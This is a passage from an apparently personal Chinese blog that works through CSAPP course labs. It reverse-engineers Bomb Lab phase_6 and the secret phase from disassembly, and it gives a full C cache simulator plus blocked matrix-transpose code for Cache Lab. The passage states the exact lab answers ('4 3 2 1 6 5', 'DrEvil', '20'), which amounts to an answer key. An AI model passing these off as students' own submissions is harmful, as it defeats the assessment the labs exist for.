&lt;phase_6+130&gt;\n第三部分虽然代码量不大，但是跳转语句很多，逻辑非常复杂。这里我采用了分部的方式，首先改写为带 goto 语句的高级语言伪代码：\n\t%esi = 0;\tgoto phase_6_163;phase_6_130:\t%rdx = Mem[%rdx + 0x8];\t%eax += 1;\tif (%eax != %ecx) goto phase_6_130;\tgoto phase_6_148;phase_6_143:\t%edx = 0x6032d0;phase_6_148:\tMem[%rsp + 2 * %rsi + 0x20] = %rdx;\t%rsi += 4;\tif (%rsi == 0x18) goto phase_6_183;phase_6_163:\t%ecx = Mem[%rsp + %rsi];\tif (%ecx &lt;= 1) goto phase_6_143;\t%eax = 1;\t%edx = 0x6032d0;\tgoto phase_6_130;\n然后对照一些常见的形式 goto 改写为循环语句，这里的翻译过程比较繁琐，需要静下来仔细思考。\n%esi = 0;while (%rsi != 0x18) &#123;\t%ecx = Mem[%rsp + %rsi];\tif (%ecx &gt; 1) &#123;\t\t%eax = 1;\t\t%rdx = 0x6032d0;\t\twhile (%eax != %ecx) &#123;\t\t\t%rdx = Mem[%rdx + 0x8];\t\t\t%eax += 1;\t\t&#125;\t&#125;\telse &#123;\t\t%edx = 0x6032d0;\t&#125;\tMem[%rsp + 2 * %rsi + 0x20] = %rdx;\t%rsi += 4;&#125;\n观察翻译后的代码，似乎和 phase_5 类似，遍历每个数字，并将每个数字当作索引 i，在起始地址为 0x6032d0 的表中查找第 i 个元素，以 %rsp + 0x20 作为起始地址创建一个线性结构。\n\n打印起始地址为 0x6032d0 的 12 个 8 字节数据，可以看到第二列中表示的值就是某一行的地址，且这些地址正好可以串联成一个线性结构，加上符号名 \\”node\\” 的提示，是不是很熟悉？没错，就是 链表 。上图每一行的第一列为值域，第二列为 next 域。\n回过来观察代码，第三部分的作用就是将输入的六个数字作为索引，创建一个数组，每个数组元素都为索引对应的 next 域。\nblock_40x00000000004011ab &lt;+183&gt;:   mov    0x20(%rsp),%rbx0x00000000004011b0 &lt;+188&gt;:   lea    0x28(%rsp),%rax0x00000000004011b5 &lt;+193&gt;:   lea    0x50(%rsp),%rsi0x00000000004011ba &lt;+198&gt;:   mov    %rbx,%rcx0x00000000004011bd &lt;+201&gt;:   mov    (%rax),%rdx0x00000000004011c0 &lt;+204&gt;:   mov    %rdx,0x8(%rcx)0x00000000004011c4 &lt;+208&gt;:   add    $0x8,%rax0x00000000004011c8 &lt;+212&gt;:   cmp    %rsi,%rax0x00000000004011cb &lt;+215&gt;:   je     0x4011d2 &lt;phase_6+222&gt;0x00000000004011cd &lt;+217&gt;:   mov    %rdx,%rcx0x00000000004011d0 &lt;+220&gt;:   jmp    0x4011bd &lt;phase_6+201&gt;\n// 创建链表%rbx = Mem[%rsp + 0x20];for (%rax = %rsp + 0x28, %rsi = %rsp + 0x50; ; %rcx = %rdx) &#123;\t%rcx = %rbx;\t%rdx = Mem[%rax];\tMem[%rcx + 8] = %rdx;\t%rax += 8;\tif (%rax == %rsi) break;&#125;\n理解清楚了第三部分，第四部分的作用就很明显了：根据第三部分创建的由 next 域构成的数组，创建一个链表结构。\nblock_50x00000000004011d2 &lt;+222&gt;:   movq   $0x0,0x8(%rdx)0x00000000004011da &lt;+230&gt;:   mov    $0x5,%ebp0x00000000004011df &lt;+235&gt;:   mov    0x8(%rbx),%rax0x00000000004011e3 &lt;+239&gt;:   mov    (%rax),%eax0x00000000004011e5 &lt;+241&gt;:   cmp    %eax,(%rbx)0x00000000004011e7 &lt;+243&gt;:   jge    0x4011ee &lt;phase_6+250&gt;0x00000000004011e9 &lt;+245&gt;:   call   0x40143a &lt;explode_bomb&gt;0x00000000004011ee &lt;+250&gt;:   mov    0x8(%rbx),%rbx0x00000000004011f2 &lt;+254&gt;:   sub    $0x1,%ebp0x00000000004011f5 &lt;+257&gt;:   jne    0x4011df &lt;phase_6+235&gt;0x00000000004011f7 &lt;+259&gt;:   add    $0x50,%rsp0x00000000004011fb &lt;+263&gt;:   pop    %rbx0x00000000004011fc &lt;+264&gt;:   pop    %rbp0x00000000004011fd &lt;+265&gt;:   pop    %r120x00000000004011ff &lt;+267&gt;:   pop    %r130x0000000000401201 &lt;+269&gt;:   pop    %r140x0000000000401203 &lt;+271&gt;:   ret\n// 遍历链表，判断是否从大到小排序，若不是，则引爆Mem[%rdx + 8] = 0;for (%ebp = 5; %ebp != 0; --%ebp) &#123;\t%rax = Mem[%rbx + 8];    %eax = Mem[%rax];    if (Mem[%rbx] &lt; %eax) &#123;        explode_bomb();    &#125;   \t%rbx = Mem[%rbx + 8];&#125;\n终于到最后一部分了，这一部分的作用很明显：判断链表是否有序，更准确地说，是否以非递增顺序排列。\n那么本关的目标终于浮出水面了：\n输入六个数字，对于每个数字 num，将 7 - num 作为索引，根据链表 node 重构出一个新的链表，并保证重构的链表按非递增顺序排列。\n注意链表值域的比较只关注低 4 字节，因此链表各结点值域从大到小排序为：3 4 5 6 1 2，那么对应的输入数字为：4 3 2 1 6 5，即本关的正确答案。\nsecret_phase解决隐藏关卡首先要解决的问题是：如何进入？观察 main 函数的汇编代码，在结束 phase_6 之后、main 函数返回之前，只有 phase_defused 函数被调用，看来入口可能隐藏在一直以来被忽略的部分。\n\n对 phase_defused 进行反汇编，结果如下：\n0x00000000004015c4 &lt;+0&gt;:     sub    $0x78,%rsp0x00000000004015c8 &lt;+4&gt;:     mov    %fs:0x28,%rax0x00000000004015d1 &lt;+13&gt;:    mov    %rax,0x68(%rsp)0x00000000004015d6 &lt;+18&gt;:    xor    %eax,%eax0x00000000004015d8 &lt;+20&gt;:    cmpl   $0x6,0x202181(%rip)        # 0x603760 &lt;num_input_strings&gt;0x00000000004015df &lt;+27&gt;:    jne    0x40163f &lt;phase_defused+123&gt;0x00000000004015e1 &lt;+29&gt;:    lea    0x10(%rsp),%r80x00000000004015e6 &lt;+34&gt;:    lea    0xc(%rsp),%rcx0x00000000004015eb &lt;+39&gt;:    lea    0x8(%rsp),%rdx0x00000000004015f0 &lt;+44&gt;:    mov    $0x402619,%esi0x00000000004015f5 &lt;+49&gt;:    mov    $0x603870,%edi0x00000000004015fa &lt;+54&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;0x00000000004015ff &lt;+59&gt;:    cmp    $0x3,%eax0x0000000000401602 &lt;+62&gt;:    jne    0x401635 &lt;phase_defused+113&gt;0x0000000000401604 &lt;+64&gt;:    mov    $0x402622,%esi0x0000000000401609 &lt;+69&gt;:    lea    0x10(%rsp),%rdi0x000000000040160e &lt;+74&gt;:    call   0x401338 &lt;strings_not_equal&gt;0x0000000000401613 &lt;+79&gt;:    test   %eax,%eax0x0000000000401615 &lt;+81&gt;:    jne    0x401635 &lt;phase_defused+113&gt;0x0000000000401617 &lt;+83&gt;:    mov    $0x4024f8,%edi0x000000000040161c &lt;+88&gt;:    call   0x400b10 &lt;puts@plt&gt;0x0000000000401621 &lt;+93&gt;:    mov    $0x402520,%edi0x0000000000401626 &lt;+98&gt;:    call   0x400b10 &lt;puts@plt&gt;0x000000000040162b &lt;+103&gt;:   mov    $0x0,%eax0x0000000000401630 &lt;+108&gt;:   call   0x401242 &lt;secret_phase&gt;0x0000000000401635 &lt;+113&gt;:   mov    $0x402558,%edi0x000000000040163a &lt;+118&gt;:   call   0x400b10 &lt;puts@plt&gt;0x000000000040163f &lt;+123&gt;:   mov    0x68(%rsp),%rax0x0000000000401644 &lt;+128&gt;:   xor    %fs:0x28,%rax0x000000000040164d &lt;+137&gt;:   je     0x401654 &lt;phase_defused+144&gt;0x000000000040164f &lt;+139&gt;:   call   0x400b30 &lt;__stack_chk_fail@plt&gt;0x0000000000401654 &lt;+144&gt;:   add    $0x78,%rsp0x0000000000401658 &lt;+148&gt;:   ret\n和之前的做法一样，将汇编代码翻译为 C 语言风格的伪代码，同时打印程序中用到的一些字符串：\n\n%rax = Mem[%fs + 0x28];Mem[%rsp + 0x68] = %rax;if (Mem[%rip + 0x202181] == 6) &#123; // num_input_strings\t%r8 = %rsp + 0x10;\t%rcx = %rsp + 0xc;\t%rdx = %rsp + 0x8;\t%rdi = 0x603870;\tsscanf(%rdi, &quot;%d %d %s&quot;, %rdx, %rcx, %r8);\tif (%eax == 3) &#123;\t\t%rdi = %rsp + 0x10;\t\tif (strings_not_equal(%rdi, &quot;DrEvil&quot;) == 0) &#123;\t\t\tputs(&quot;Curses, you&#x27;ve found the secret phase!&quot;);\t\t\tputs(&quot;But finding it and solving it are quite different...&quot;);\t\t\t%eax = 0;\t\t\tsecret_phase();\t\t&#125;\t&#125;\tputs(&quot;Congratulations! You&#x27;ve defused the bomb!&quot;);&#125;%rax = Mem[%rsp + 0x68];if (%rax != Mem[%fs + 0x28]) &#123;\t__stack_chk_fail();&#125;\n仔细分析上述代码的逻辑，当输入的字符串个数等于 6 时，即解决了 phase_1 ~ phase_6 所有关卡后，程序调用 sscanf 从地址 0x603870 处读取以空格分隔的两个整数和一个字符串，分别存入寄存器 %rdx、%rcx 和 %r8 中，当函数返回值为 3，即成功匹配了 3 个值，且匹配到的第三个值（字符串）等于 \\”DrEvil\\” 时，即可进入隐藏关卡。\n但是上面我们已经打印了地址 0x603870 处的字符串，为 3 0，只有两个，无法使得匹配数为 3. 我最开始想到的解决方法就是在调试过程中手动更改该地址处的值，但是这样的做法也只具备调试作用，进入隐藏关卡密码仍然无法得到。\n换个角度来思考，这个 3 0 有没有可能不是硬编码的数据，而是我们手动输入的？记得之前 phase_4 的正确密码之一就是 3 0。\n将断点设置在 phase_4 处，并打印 %rdi 寄存器的值， 发现正好就是 0x603870，因此 phase_4 的完整密码应该是 3 0 DrEvil （正如前面所说，前两位也可以是 1 0、7 0 等）。\n\n注意末尾的 DrEvil 在 phase_4 中并不会被读取，因为模式字符串为 “%d %d”，因此匹配成功的值最多为 2，不会影响 cmp  $0x2, %eax 的判断。\n\n\n经过前面的准备，终于可以着手解决隐藏关卡了，相信有了前面这些关卡的锻炼，隐藏关卡不会显得太难。\n0x0000000000401242 &lt;+0&gt;:     push   %rbx0x0000000000401243 &lt;+1&gt;:     call   0x40149e &lt;read_line&gt;0x0000000000401248 &lt;+6&gt;:     mov    $0xa,%edx0x000000000040124d &lt;+11&gt;:    mov    $0x0,%esi0x0000000000401252 &lt;+16&gt;:    mov    %rax,%rdi0x0000000000401255 &lt;+19&gt;:    call   0x400bd0 &lt;strtol@plt&gt;0x000000000040125a &lt;+24&gt;:    mov    %rax,%rbx0x000000000040125d &lt;+27&gt;:    lea    -0x1(%rax),%eax0x0000000000401260 &lt;+30&gt;:    cmp    $0x3e8,%eax0x0000000000401265 &lt;+35&gt;:    jbe    0x40126c &lt;secret_phase+42&gt;0x0000000000401267 &lt;+37&gt;:    call   0x40143a &lt;explode_bomb&gt;0x000000000040126c &lt;+42&gt;:    mov    %ebx,%esi0x000000000040126e &lt;+44&gt;:    mov    $0x6030f0,%edi0x0000000000401273 &lt;+49&gt;:    call   0x401204 &lt;fun7&gt;0x0000000000401278 &lt;+54&gt;:    cmp    $0x2,%eax0x000000000040127b &lt;+57&gt;:    je     0x401282 &lt;secret_phase+64&gt;0x000000000040127d &lt;+59&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000401282 &lt;+64&gt;:    mov    $0x402438,%edi0x0000000000401287 &lt;+69&gt;:    call   0x400b10 &lt;puts@plt&gt;0x000000000040128c &lt;+74&gt;:    call   0x4015c4 &lt;phase_defused&gt;0x0000000000401291 &lt;+79&gt;:    pop    %rbx0x0000000000401292 &lt;+80&gt;:    ret\nread_line();strtol(%rax, 0, 0xa);%rbx = %rax;%eax = %rax - 1;if (%eax &gt; 0x3e8) &#123;  // 无符号比较\texplode_bomb();&#125;fun7(0x6030f0, %ebx);if (%eax != 2) &#123;\texplode_bomb();&#125;puts(0x402438);phase_defused();\n可以看到，隐藏关卡的代码逻辑还是比较清晰的：读取一行，应该是隐藏关卡的密码，将其转换为 long 类型，然后又是和之前类似的范围限定语句，随后调用函数 fun7，如果返回值为 2，则密码输入正确。\n问题的关键还是在于函数 fun7，其代码如下：\n0x0000000000401204 &lt;+0&gt;:     sub    $0x8,%rsp0x0000000000401208 &lt;+4&gt;:     test   %rdi,%rdi0x000000000040120b &lt;+7&gt;:     je     0x401238 &lt;fun7+52&gt;0x000000000040120d &lt;+9&gt;:     mov    (%rdi),%edx0x000000000040120f &lt;+11&gt;:    cmp    %esi,%edx0x0000000000401211 &lt;+13&gt;:    jle    0x401220 &lt;fun7+28&gt;0x0000000000401213 &lt;+15&gt;:    mov    0x8(%rdi),%rdi0x0000000000401217 &lt;+19&gt;:    call   0x401204 &lt;fun7&gt;0x000000000040121c &lt;+24&gt;:    add    %eax,%eax0x000000000040121e &lt;+26&gt;:    jmp    0x40123d &lt;fun7+57&gt;0x0000000000401220 &lt;+28&gt;:    mov    $0x0,%eax0x0000000000401225 &lt;+33&gt;:    cmp    %esi,%edx0x0000000000401227 &lt;+35&gt;:    je     0x40123d &lt;fun7+57&gt;0x0000000000401229 &lt;+37&gt;:    mov    0x10(%rdi),%rdi0x000000000040122d &lt;+41&gt;:    call   0x401204 &lt;fun7&gt;0x0000000000401232 &lt;+46&gt;:    lea    0x1(%rax,%rax,1),%eax0x0000000000401236 &lt;+50&gt;:    jmp    0x40123d &lt;fun7+57&gt;0x0000000000401238 &lt;+52&gt;:    mov    $0xffffffff,%eax0x000000000040123d &lt;+57&gt;:    add    $0x8,%rsp0x0000000000401241 &lt;+61&gt;:    ret\nunsigned fun7(unsigned x, unsigned y) &#123;    if (x == 0) &#123;        return 0xffffffff;    &#125;    int z = *x;    if (z &gt; y) &#123;        return 2 * fun7(*(x + 8), y);    &#125;    else if (z == y) &#123;        return 0;    &#125;    else &#123;        return 2 * fun7(*(x + 16), y) + 1;    &#125;&#125;\n又是一个递归函数，不过和 phase_4 不同，这个函数的代码显得很有规律，看到 *(x + 8) 和 *(x + 16) 这样的表达式很容易想到可能又是某种链接结构，不妨打印 0x6030f0 处的内容：\n\n这下结果很明确了，每个结点包含两个链接（指针）域，没错，正是二叉树。为了分析的方便，我根据上图的数据内容绘制了一个等价的二叉树，如下图所示：\n\n可以看到，每个结点由 4 个 8 字节组成，前三个应该分别是值域、左孩子、右孩子，最后一个全为 0 的 8 字节貌似很多余，个人推测应该是 C 语言结构体的 字节对齐 导致的。\n\n\n最后再回到函数 fun7 中，要使得最终结果等于 2，一种可能的计算方法如下：\n\n我们只需要保证二叉树遍历时依次遍历左孩子、右孩子、左孩子，且输入密码正好等于叶子结点即可，0x14 正好就满足条件，因此隐藏关卡的密码为 20.\n至此，”炸弹“ 成功被”拆除“。\n","categories":["计算机基础"],"tags":["经验","计算机基础","汇编语言"]},{"title":"CSAPP Cache Lab","url":"/2024/12/17/CSAPP-Cache-Lab/","content":"本 Lab 主要考察对计算机高速缓存（Cache）机制的理解，以及如何针对 Cache 进行程序的优化，对应知识点为书中的 6.4 ~ 6.6 节内容。\n\nPart A: Writing a Cache Simulator思路基本流程Part A 需要实现一个 Cache 模拟器，能够根据 valgrind 工具所生成的访存跟踪数据，模拟在特定参数的 Cache 环境下的命中（hits）次数、不命中（misses）次数和置换（evictions）次数，目标是实现与 csim-ref 同等的功能。模拟器需要具备的几个功能模块如下：\n\n对命令行参数进行参数解析。\n\n读取 trace 文件并解析为地址访问流。\n\n定义 Cache 模拟器数据结构，以及相关的函数操作，包括初始化和地址访问。\n\n遍历解析出来的地址访问流，依次进行访问模拟，计算得到命中次数等信息。\n\n\n接下来分别对它们进行介绍。\n命令行参数解析根据实验手册的提示，可以使用 getopt 函数进行命令行参数的解析。另外，如果需要支持长选项（形如 --opt arg），则可以使用 GNU C 库提供的扩展版本 getopt_long 函数，其使用方法如下：\n\n\ngenerated by GPT4o\n\n函数原型include &lt;getopt.h&gt;int getopt_long(int argc, char *const argv[],                const char *optstring,                const struct option *longopts,                int *longindex);\n\n参数说明1. argc 和 argv与标准 getopt 相同，分别表示命令行参数的个数和数组。\n2. optstring一个字符串，表示短选项的格式规则：\n\n每个选项是一个字符。\n如果选项需要参数，在字符后添加一个冒号（:）。\n如果选项的参数是可选的，在字符后添加两个冒号（::）。\n\n3. longopts一个指向 struct option 数组的指针，用于定义长选项。\nstruct option 定义如下：\nstruct option &#123;    const char *name; // 长选项的名称    int has_arg;      // 选项是否需要参数（no_argument, required_argument, optional_argument）    int *flag;        // 如果为 NULL，则返回值为 val；否则将 *flag 设置为 val 并返回 0    int val;          // 短选项的字符值或自定义值&#125;;\n\nname：长选项名称，例如 &quot;help&quot; 对应 --help。\nhas_arg：\nno_argument（0）：无参数。\nrequired_argument（1）：需要参数。\noptional_argument（2）：参数可选。\n\n\nflag：\n如果为 NULL，getopt_long 会返回 val 的值。\n如果非 NULL，getopt_long 会将 *flag 设置为 val，并返回 0。\n\n\nval：指定与该长选项关联的返回值（通常与短选项的字符值一致）。\n\n4. longindex指向一个整型变量的指针，用于存储被解析的长选项在 longopts 数组中的索引位置。如果不需要，可以传 NULL。\n\n返回值\n返回短选项的字符值，或者由 struct option 中 val 指定的值。\n遇到未知选项时返回 ?。\n当没有更多选项时，返回 -1。\n\n\n根据 getopt_long 的返回值，以及全局变量 optarg，可以对不同的命令行参数进行分发处理。\n// 参数定义struct option long_options[] = &#123;    &#123; &quot;help&quot;, no_argument, NULL, &#x27;h&#x27; &#125;,    &#123; &quot;verbose&quot;, no_argument, NULL, &#x27;v&#x27; &#125;,    &#123; &quot;set&quot;, required_argument, NULL, &#x27;s&#x27; &#125;,    &#123; &quot;lines&quot;, required_argument, NULL, &#x27;E&#x27; &#125;,    &#123; &quot;block&quot;, required_argument, NULL, &#x27;b&#x27; &#125;,    &#123; &quot;trace&quot;, required_argument, NULL, &#x27;t&#x27; &#125;,    &#123; 0, 0, 0, 0 &#125;&#125;;// 参数解析int opt;while ((opt = getopt_long(argc, argv, &quot;hvs:E:b:t:&quot;, long_options, NULL)) != -1) &#123;    switch (opt) &#123;        case &#x27;h&#x27;:            print_usage();            return 0;        case &#x27;v&#x27;:            vflag = 1;            break;        case &#x27;s&#x27;:            s = atoi(optarg);            break;        case &#x27;E&#x27;:            E = atoi(optarg);            break;        case &#x27;b&#x27;:            b = atoi(optarg);            break;        case &#x27;t&#x27;:            trace_file = optarg;            break;        default:            print_usage();            return 1;    &#125;&#125;\ntrace 文件解析对 trace 文件进行解析，首先读取文件中的每一行操作，对于 operation 为 I 的访存操作，直接跳过不做处理。由于剩余的 M, L, S 操作都满足格式 [space]operation address,size，因此可以直接使用 sscanf 进行解析，提取出各字段。\n对不同操作的处理比较简单：L 和 S 操作需要一次访存，M 操作需要两次访存。\n\n这里我没有考虑一次访存位于多个 Cache 行中的情况，始终视作一次/两次访存，也通过了全部测试样例。\n\nchar line[256];while (fgets(line, sizeof(line), file)) &#123;    if (line[0] == &#x27;\\n&#x27; || line[0] != &#x27; &#x27;) continue;    line[strlen(line) - 1] = &#x27;\\0&#x27;;  // 去除尾置换行符    char *pline = line + 1;         // 去除前导空格    char operation;    int address, size;    if (sscanf(pline, &quot; %c %x,%d&quot;, &amp;operation, &amp;address, &amp;size) != 3) &#123;        fprintf(stderr, &quot;Invalid line format: %s\\n&quot;, pline);        continue;    &#125;    access_cache(&amp;cache, address);    if (operation == &#x27;M&#x27;) &#123;        access_cache(&amp;cache, address);    &#125;&#125;\nCache 模拟器数据结构设计整个 Cache 模拟器包含 Cache 数据部分、Cache 的参数和命中次数等模拟结果。\ntypedef struct &#123;    int s;    int E;    int b;    int set_num;    CacheSet *sets;    int hit_count;    int miss_count;    int evict_count;    int access_count;&#125; Cache;\ns, E, b 参数即命令行输入的参数。Cache 数据部分可以划分为若干个 Cache 组，组的数量 set_num 等于 $2^s$。\n每个 Cache 组可划分为 E 个 Cache 行。\ntypedef struct &#123;    CacheLine *lines;&#125; CacheSet;\n而每个 Cache 行包含有效位、tag 和访问位。由于我们只需要统计命中次数等信息，因此在进行访存模拟时，无需实际存储任何数据内容，只需要将有效位置为 1，并更新 tag 和访问位（用于行替换策略）。\ntypedef struct &#123;    int valid;    int tag;    int last_used;&#125; CacheLine;\n地址访问根据地址进行模拟访存时，首先需要根据地址 address 获取 Cache 数据中对应的组号 index 和 tag。\n\n组号即地址 address 的第 $b$ 到 $b + s$ 位，tag 即地址 address 的高位部分。\nvoid get_cache_parts(Cache *cache, int address, int *tag, int *index)&#123;    *index = (address &gt;&gt; cache-&gt;b) &amp; (cache-&gt;set_num - 1);    *tag = address &gt;&gt; (cache-&gt;s + cache-&gt;b);&#125;\n得到组号和 tag 后，遍历对应 Cache 组的所有行，进行 tag 的对比。若存在某一行的 tag 与 address 对应的 tag 相同，说明缓存命中，更新 hit_count 次数；否则，缓存不命中，更新 miss_count 次数，并将不命中的内存块写入 Cache 中。\nint isHit = 0;  // 是否命中CacheSet *set = &amp;cache-&gt;sets[index];for (int i = 0; i &lt; cache-&gt;E; ++i) &#123;    if (set-&gt;lines[i].valid == 1 &amp;&amp; set-&gt;lines[i].tag == tag) &#123;        isHit = 1;        ++cache-&gt;hit_count;        set-&gt;lines[i].last_used = cache-&gt;access_count++;        break;    &#125;&#125;\n这里可能涉及到 Cache 组已满的情况，为此需要进行替换，替换策略采用 LRU 策略，即选取最近最久未被访问过的 Cache 行。为此需要维护访问位，这里为了实现的方便，访问“位” last_used 使用一个整数来存储，其值表示本 Cache 行最近一次访问是整个 Cache 的第 last_used 次访问。因此，last_used 值越小，表示本行最近最久未被访问。\nif (!isHit) &#123;   // 未命中    ++cache-&gt;miss_count;    int lru_index = 0;    for (int i = 1; i &lt; cache-&gt;E; ++i) &#123;        // LRU策略选择写入行        if (set-&gt;lines[i].last_used &lt; set-&gt;lines[lru_index].last_used) &#123;            lru_index = i;        &#125;    &#125;    if (set-&gt;lines[lru_index].valid == 1) &#123;        ++cache-&gt;evict_count;  // 行置换    &#125;    set-&gt;lines[lru_index].valid = 1;    set-&gt;lines[lru_index].tag = tag;    set-&gt;lines[lru_index].last_used = cache-&gt;access_count++;&#125;\n代码#include &quot;cachelab.h&quot;#include &lt;getopt.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;math.h&gt;#include &lt;string.h&gt;int vflag;  // verbose flag// 根据vflag选择是否打印信息void trace_info(const char* info)&#123;    if (vflag) &#123;        printf(&quot;%s&quot;, info);    &#125;&#125;// 缓存行typedef struct &#123;    int valid;    int tag;    int last_used;&#125; CacheLine;// 缓存组typedef struct &#123;    CacheLine *lines;&#125; CacheSet;// 缓存模拟器typedef struct &#123;    int s;    int E;    int b;    int set_num;    CacheSet *sets;    int hit_count;    int miss_count;    int evict_count;    int access_count;&#125; Cache;// 初始化缓存模拟器void init_cache(Cache *cache, int s, int E, int b)&#123;    cache-&gt;s = s;    cache-&gt;E = E;    cache-&gt;b = b;    cache-&gt;set_num = 1 &lt;&lt; s;    cache-&gt;sets = (CacheSet *)malloc(cache-&gt;set_num * sizeof(CacheSet));    for (int i = 0; i &lt; cache-&gt;set_num; ++i) &#123;        cache-&gt;sets[i].lines = (CacheLine *)malloc(E * sizeof(CacheLine));        for (int j = 0; j &lt; E; ++j) &#123;            cache-&gt;sets[i].lines[j].valid = 0;             cache-&gt;sets[i].lines[j].last_used = 0;        &#125;    &#125;    cache-&gt;hit_count = 0;    cache-&gt;miss_count = 0;    cache-&gt;evict_count = 0;    cache-&gt;access_count = 0;&#125;// 获取地址对应组号和tagvoid get_cache_parts(Cache *cache, int address, int *tag, int *index)&#123;    *index = (address &gt;&gt; cache-&gt;b) &amp; (cache-&gt;set_num - 1);    *tag = address &gt;&gt; (cache-&gt;s + cache-&gt;b);&#125;// 访问指定地址对应的cache组号和tagvoid access_cache(Cache *cache, int address)&#123;    int tag, index;    get_cache_parts(cache, address, &amp;tag, &amp;index);    int isHit = 0;  // 是否命中    CacheSet *set = &amp;cache-&gt;sets[index];    for (int i = 0; i &lt; cache-&gt;E; ++i) &#123;        if (set-&gt;lines[i].valid == 1 &amp;&amp; set-&gt;lines[i].tag == tag) &#123;            isHit = 1;            trace_info(&quot; hit&quot;);            ++cache-&gt;hit_count;            set-&gt;lines[i].last_used = cache-&gt;access_count++;            break;        &#125;    &#125;    if (!isHit) &#123;   // 未命中        trace_info(&quot; miss&quot;);        ++cache-&gt;miss_count;        int lru_index = 0;        for (int i = 1; i &lt; cache-&gt;E; ++i) &#123;            // LRU策略选择写入行            if (set-&gt;lines[i].last_used &lt; set-&gt;lines[lru_index].last_used) &#123;                lru_index = i;            &#125;        &#125;        if (set-&gt;lines[lru_index].valid == 1) &#123;            trace_info(&quot; eviction&quot;);            ++cache-&gt;evict_count;  // 行置换        &#125;        set-&gt;lines[lru_index].valid = 1;        set-&gt;lines[lru_index].tag = tag;        set-&gt;lines[lru_index].last_used = cache-&gt;access_count++;    &#125;    ++cache-&gt;access_count;&#125;void print_usage()&#123;    printf(&quot;Usage: ./csim-ref [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;\\n&quot;);    printf(&quot;Options:\\n&quot;);    printf(&quot;  -h         Print this help message.\\n&quot;);    printf(&quot;  -v         Optional verbose flag.\\n&quot;);    printf(&quot;  -s &lt;num&gt;   Number of set index bits.\\n&quot;);    printf(&quot;  -E &lt;num&gt;   Number of lines per set.\\n&quot;);    printf(&quot;  -b &lt;num&gt;   Number of block offset bits.\\n&quot;);    printf(&quot;  -t &lt;file&gt;  Trace file.\\n\\n&quot;);    printf(&quot;Examples:\\n&quot;);    printf(&quot;  linux&gt;  ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace\\n&quot;);    printf(&quot;  linux&gt;  ./csim-ref -v -s 8 -E 2 -b 4 -t traces/yi.trace\\n&quot;);&#125;int main(int argc, char *argv[])&#123;    vflag = 0;    int s = -1, E = -1, b = -1;    char *trace_file = NULL;    // 参数定义    struct option long_options[] = &#123;        &#123; &quot;help&quot;, no_argument, NULL, &#x27;h&#x27; &#125;,        &#123; &quot;verbose&quot;, no_argument, NULL, &#x27;v&#x27; &#125;,        &#123; &quot;set&quot;, required_argument, NULL, &#x27;s&#x27; &#125;,        &#123; &quot;lines&quot;, required_argument, NULL, &#x27;E&#x27; &#125;,        &#123; &quot;block&quot;, required_argument, NULL, &#x27;b&#x27; &#125;,        &#123; &quot;trace&quot;, required_argument, NULL, &#x27;t&#x27; &#125;,        &#123; 0, 0, 0, 0 &#125;    &#125;;    // 参数解析    int opt;    while ((opt = getopt_long(argc, argv, &quot;hvs:E:b:t:&quot;, long_options, NULL)) != -1) &#123;        switch (opt) &#123;            case &#x27;h&#x27;:                print_usage();                return 0;            case &#x27;v&#x27;:                vflag = 1;                break;            case &#x27;s&#x27;:                s = atoi(optarg);                break;            case &#x27;E&#x27;:                E = atoi(optarg);                break;            case &#x27;b&#x27;:                b = atoi(optarg);                break;            case &#x27;t&#x27;:                trace_file = optarg;                break;            default:                print_usage();                return 1;        &#125;    &#125;    Cache cache;    init_cache(&amp;cache, s, E, b);    FILE *file = fopen(trace_file, &quot;r&quot;);    if (!file) &#123;        fprintf(stderr, &quot;Faild to open file %s\\n&quot;, trace_file);        return -1;    &#125;    char line[256];    while (fgets(line, sizeof(line), file)) &#123;        if (line[0] == &#x27;\\n&#x27; || line[0] != &#x27; &#x27;) continue;        line[strlen(line) - 1] = &#x27;\\0&#x27;;  // 去除尾置换行符        char *pline = line + 1;         // 去除前导空格                char operation;        int address, size;        if (sscanf(pline, &quot; %c %x,%d&quot;, &amp;operation, &amp;address, &amp;size) != 3) &#123;            fprintf(stderr, &quot;Invalid line format: %s\\n&quot;, pline);            continue;        &#125;                trace_info(pline);                access_cache(&amp;cache, address);        if (operation == &#x27;M&#x27;) &#123;            access_cache(&amp;cache, address);        &#125;                trace_info(&quot;\\n&quot;);    &#125;    printSummary(cache.hit_count, cache.miss_count, cache.evict_count);    return 0;&#125;\nPart B: Optimizing Matrix Transpose分块优化根据实验手册的说明，分块是降低 Cache misses 的有效方法，可以参考矩阵乘分块优化方法。\n对于朴素二重循环的矩阵转置方法，矩阵 $A$ 的空间局部性较好，但是矩阵 $B$ 的时间局部性和空间局部性都比较差，访问效率很低。而采用分块方法时，矩阵 $A$ 的空间局部性没有太大下降，但是 $B$ 的时间局部性和空间局部性却有了很大的提升。\n因此我先尝试了分块优化方法，问题在于，块大小应该如何选取？为了偷懒（🤭），我利用 C 语言宏编写了一个分块矩阵转置的函数模板，并测试三个测试样例在不同块大小下的 Cache misses 次数。\n#define DEFINE_BLOCKED_TRANSPOSE(R, C)                                       \\char blocked##R##_##C##_trans_desc[] = &quot;(&quot; #R &quot;, &quot; #C &quot;) Blocked row-wise scan transpose&quot;; \\void blocked##R##_##C##_trans(int M, int N, int A[N][M], int B[M][N])       \\&#123;                                                                           \\    int i, j, ii, jj, tmp;                                                  \\    int brsize = R, bcsize = C;                                             \\    int enr = brsize * (N / brsize);                                        \\    int enc = bcsize * (M / bcsize);                                        \\                                                                            \\    for (ii = 0; ii &lt;= enr; ii += brsize) &#123;                                 \\        for (jj = 0; jj &lt;= enc; jj += bcsize) &#123;                             \\            for (i = ii; i &lt; (N &lt; ii + brsize ? N : ii + brsize); ++i) &#123;    \\                for (j = jj; j &lt; (M &lt; jj + bcsize ? M : jj + bcsize); ++j) &#123;\\                    tmp = A[i][j];                                          \\                    B[j][i] = tmp;                                          \\                &#125;                                                           \\            &#125;                                                               \\        &#125;                                                                   \\    &#125;                                                                       \\&#125;\n在使用时，只需要将模板“实例化”即可：\nDEFINE_BLOCKED_TRANSPOSE(4, 4)DEFINE_BLOCKED_TRANSPOSE(5, 5)...DEFINE_BLOCKED_TRANSPOSE(20, 20)\n然后将这些函数注册到 registerFunctions 中，使用 test-trans 